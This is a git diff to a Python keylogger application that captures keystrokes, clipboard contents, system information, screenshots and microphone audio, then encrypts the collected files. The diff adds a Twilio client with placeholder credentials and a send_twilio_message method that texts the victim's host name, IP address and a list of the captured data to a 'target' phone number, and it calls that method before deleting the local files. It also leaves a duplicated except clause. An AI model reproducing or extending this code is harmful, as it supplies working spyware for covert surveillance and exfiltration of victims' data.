@@ -13,6 +13,7 @@ from scipy.io.wavfile import write
 from cryptography.fernet import Fernet
 from pynput.keyboard import Key, Listener
 import threading
+from twilio.rest import Client
 
 class KeyloggerApp:
     def __init__(self, master):
@@ -47,7 +48,7 @@ class KeyloggerApp:
         self.file_merge = self.file_path + self.extend
         
         # Set specific path for Cryptography folder
-        self.cryptography_folder = r"C:\Users\ymani\OneDrive\Desktop\Keylogger-main\cryptography"
+        self.cryptography_folder = r"C:\Users\ymani\OneDrive\Desktop\Projects\Keylogger\cryptography"
         if not os.path.exists(self.cryptography_folder):
             os.makedirs(self.cryptography_folder)
             self.log_message(f"Created Cryptography folder at: {self.cryptography_folder}")
@@ -61,6 +62,12 @@ class KeyloggerApp:
         self.keys_information_e = "e_key_log.txt"
         self.system_information_e = "e_systeminfo.txt"
         self.clipboard_information_e = "e_clipboard.txt"
+        
+        # Twilio credentials
+        self.account_sid = "TWILIO_ACCOUNT_SID"
+        self.auth_token = "TWILIO_ACCOUNT_TOKEN"
+        self.twilio_phone = "TWILIO_PHONE_NUMBER"
+        self.target_phone = "TARGET_PHONE_NUMBER"
         
         self.microphone_time = 10
         self.time_iteration = 15
@@ -80,6 +87,7 @@ class KeyloggerApp:
         self.keylogger_thread = None
         self.currentTime = 0
         self.stoppingTime = 0
+        self.count = 0
         
         self.log_area.insert(tk.END, "System Information Utility initialized.\n")
         self.log_area.insert(tk.END, f"Working directory: {self.file_path}\n")
@@ -187,6 +195,7 @@ class KeyloggerApp:
                 with open(file_path, 'rb') as f:
                     data = f.read()
                 
+                self.log_message(f"Data size for {os.path.basename(file_path)}: {len(data)} bytes")
                 encrypted = self.fernet.encrypt(data)
                 
                 with open(encrypted_file_names[i], 'wb') as f:
@@ -195,8 +204,38 @@ class KeyloggerApp:
                 self.log_message(f"Encrypted: {os.path.basename(file_path)} → {os.path.basename(encrypted_file_names[i])}")
             except Exception as e:
                 self.log_message(f"Encryption error for {os.path.basename(file_path)}: {str(e)}")
+                self.log_message(f"Failed to encrypt {os.path.basename(file_path)}")
+            except Exception as e:
+                self.log_message(f"Encryption error for {os.path.basename(file_path)}: {str(e)}")
         
         self.log_message("Encryption complete")
+
+    def send_twilio_message(self):
+        self.log_message("Sending data via Twilio SMS...")
+        
+        try:
+            # Initialize Twilio client
+            client = Client(self.account_sid, self.auth_token)
+            
+            # Prepare message content 
+            hostname = socket.gethostname()
+            ip_addr = socket.gethostbyname(hostname)
+            
+            message_body = f"CRUCIAL INFORMATION FROM KEYLOGGER!\n"
+            message_body += f"Host: {hostname}\n"
+            message_body += f"IP: {ip_addr}\n"
+            message_body += f"Files captured: system info, clipboard data, keystrokes, screenshot, audio"
+            
+            # Send message
+            message = client.messages.create(
+                body=message_body,
+                from_=self.twilio_phone,
+                to=self.target_phone
+            )
+            
+            self.log_message(f"SMS sent successfully! SID: {message.sid}")
+        except Exception as e:
+            self.log_message(f"Failed to send SMS: {str(e)}")
 
     def delete_files(self):
         self.log_message("Cleaning up temporary files...")
@@ -286,6 +325,7 @@ class KeyloggerApp:
         if self.is_running:
             self.log_message("Keylogger monitoring complete")
             self.encrypt_files()
+            self.send_twilio_message()  # Send SMS with collected information
             self.delete_files()
             self.is_running = False
             self.status_label.config(text="Status: Idle")
